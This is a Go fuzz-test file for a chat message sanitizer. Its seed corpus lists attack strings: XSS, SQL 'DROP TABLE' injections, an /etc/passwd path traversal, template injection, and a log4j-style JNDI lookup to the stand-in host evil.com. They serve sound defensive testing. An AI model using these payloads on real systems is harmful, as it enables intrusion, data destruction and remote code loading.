package handlers

import (
	"strings"
	"testing"
)

// MaxMessageLength is the maximum allowed message length (10KB).
const MaxMessageLength = 10 * 1024

// FuzzMessageContent tests message content validation with malicious inputs.
// This ensures message processing never panics and properly handles edge cases.
func FuzzMessageContent(f *testing.F) {
	// Seed corpus with various inputs
	f.Add("Hello world")
	f.Add("")                                                    // empty
	f.Add(strings.Repeat("A", 100000))                           // huge content
	f.Add("<script>alert(1)</script>")                           // XSS
	f.Add("\\x00\\x01\\x02")                                     // escape sequences
	f.Add("unicode: \u0000\uffff")                               // unicode extremes
	f.Add(string([]byte{0xFF, 0xFE, 0xFD}))                      // invalid UTF-8
	f.Add("newline\ninjection\r\ntest")                          // newlines
	f.Add("tab\ttest")                                           // tabs
	f.Add("emoji: 💩🔥✨")                                          // emoji
	f.Add(strings.Repeat("nested ", 1000) + "test")              // deeply nested words
	f.Add("SELECT * FROM users WHERE id = 1; DROP TABLE users;") // SQL injection attempt
	f.Add("'; DROP TABLE messages; --")                          // SQL injection
	f.Add("../../../etc/passwd")                                 // path traversal
	f.Add("${jndi:ldap://evil.com/a}")                           // log4j style injection
	f.Add("{{7*7}}")                                             // template injection
	f.Add("<img src=x onerror=alert(1)>")                        // XSS with image
	f.Add("javascript:alert(1)")                                 // javascript protocol
	f.Add("data:text/html,<script>alert(1)</script>")            // data URL
	f.Add(strings.Repeat("\u200B", 1000))                        // zero-width spaces
	f.Add("RTL override: \u202E test")                           // right-to-left override
	f.Add("Combining characters: a\u0300\u0301\u0302")           // diacritics

	f.Fuzz(func(t *testing.T, content string) {
		// Should NEVER panic, even with malicious input
		defer func() {
			if r := recover(); r != nil {
				t.Errorf("Message processing panicked with content (len=%d): %v", len(content), r)
			}
		}()

		// Validate content (simulate what the handler does)
		sanitized := validateAndSanitizeMessage(content)

		// Sanitized content should never exceed max length
		if len(sanitized) > MaxMessageLength {
			t.Errorf("Sanitized content exceeds max length: %d > %d", len(sanitized), MaxMessageLength)
		}

		// Sanitized content should be valid UTF-8
		if !isValidUTF8(sanitized) {
			t.Errorf("Sanitized content contains invalid UTF-8")
		}
	})
}

// validateAndSanitizeMessage validates and sanitizes user message content.
// This is a critical security function that must never panic.
func validateAndSanitizeMessage(content string) string {
	// Trim whitespace
	content = strings.TrimSpace(content)

	// Enforce maximum length
	if len(content) > MaxMessageLength {
		content = content[:MaxMessageLength]
	}

	// Remove null bytes (can break C strings, PostgreSQL TEXT fields)
	content = strings.ReplaceAll(content, "\x00", "")

	// Normalize newlines to \n
	content = strings.ReplaceAll(content, "\r\n", "\n")
	content = strings.ReplaceAll(content, "\r", "\n")

	// Remove control characters except \n and \t
	var filtered strings.Builder
	filtered.Grow(len(content))
	for _, r := range content {
		// Allow printable characters, newlines, and tabs
		if r == '\n' || r == '\t' || (r >= 32 && r != 127) {
			filtered.WriteRune(r)
		}
	}

	return filtered.String()
}

// isValidUTF8 checks if a string is valid UTF-8.
func isValidUTF8(s string) bool {
	for _, r := range s {
		if r == '\uFFFD' {
			// Replacement character indicates invalid UTF-8
			// However, the string might actually contain U+FFFD intentionally
			// So we check if the byte sequence is valid
			return strings.ToValidUTF8(s, "") == s
		}
	}
	return true
}

// FuzzExtractTextContent tests the extractTextContent helper with malicious ai.Part inputs.
// This ensures the function handles edge cases without panicking.
func FuzzExtractTextContent(f *testing.F) {
	// Note: We can't easily fuzz with actual ai.Part objects since they require
	// complex initialization. This test would be better as a property-based test
	// with the actual Genkit types. For now, we test the string handling logic.

	f.Add("normal text")
	f.Add("")
	f.Add(strings.Repeat("A", 100000))
	f.Add("text with \x00 null bytes")
	f.Add("unicode: \U0001F4A9")

	f.Fuzz(func(t *testing.T, text string) {
		defer func() {
			if r := recover(); r != nil {
				t.Errorf("extractTextContent panicked with text (len=%d): %v", len(text), r)
			}
		}()

		// Simulate concatenating text from multiple parts
		var result strings.Builder
		for i := 0; i < 10; i++ {
			result.WriteString(text)
		}

		extracted := result.String()

		// Should not panic on extremely long strings
		_ = len(extracted)
	})
}
